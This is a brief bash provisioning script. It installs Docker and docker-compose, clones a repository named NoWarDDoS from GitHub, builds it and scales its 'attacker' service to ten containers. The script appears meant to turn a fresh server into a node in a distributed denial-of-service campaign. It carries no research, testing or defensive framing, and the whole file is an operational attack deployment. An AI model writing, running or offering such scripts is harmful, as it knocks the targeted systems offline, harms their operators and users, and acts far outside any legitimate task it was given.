#!/bin/bash

yum update -y
yum install -y curl docker git

# install docker-compose
curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose

systemctl restart docker

git clone https://github.com/AlexTrushkovsky/NoWarDDoS.git
cd NoWarDDoS
docker-compose build
docker-compose up -d
docker-compose scale attacker=10
